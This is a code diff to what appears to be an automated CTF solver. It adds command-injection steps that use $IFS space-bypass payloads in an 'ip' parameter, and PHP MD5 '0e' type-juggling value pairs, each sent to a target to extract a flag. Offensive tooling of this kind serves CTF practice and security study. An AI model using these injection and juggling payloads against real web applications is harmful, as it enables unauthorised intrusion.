@@ -1939,6 +1939,19 @@ class CMDiMachine(RouteStateMachine):
                 "extract_flag": True,
             })
 
+        # $IFS payloads with 'ip' param (PingPingPing pattern)
+        # This ensures the target is hit even if param detection picks a different name.
+        if param != "ip":
+            for ifs_p in ifs_payloads:
+                steps.append({
+                    "name": f"ifs_ip_{hash(ifs_p) & 0xffff:x}",
+                    "description": f"$IFS空格绕过 (ip): {ifs_p[:35]}",
+                    "method": method,
+                    "path": path,
+                    "params" if method == "GET" else "data": {"ip": ifs_p},
+                    "extract_flag": True,
+                })
+
         # Standard separators
         separators = [";", "|", "`", "$()", "&&", "||"]
         for sep in separators:
@@ -2602,6 +2615,23 @@ class PHPPopMachine(RouteStateMachine):
         # notes so the agent (or a human reviewer) can switch to a real chain
         # generator when needed.
         steps: List[Dict[str, Any]] = []
+
+        # ---- PHP MD5 type juggling (0e collision) ----
+        # md5($a)==md5($b) with different values whose md5 starts with 0e + digits
+        md5_0e_pairs = [
+            ("QNKCDZO", "240610708"),
+            ("s878926199a", "s155964671a"),
+            ("s214587387a", "0e215962017"),
+        ]
+        for a_val, b_val in md5_0e_pairs:
+            steps.append({
+                "name": f"md5_0e_{hash(a_val) & 0xffff:x}",
+                "description": f"PHP MD5 0e 类型混淆: a={a_val}&b={b_val}",
+                "method": "GET",
+                "path": "/",
+                "params": {"a": a_val, "b": b_val},
+                "extract_flag": True,
+            })
 
         # ---- Cookie unserialize on /admin ----
         admin_cookies = [
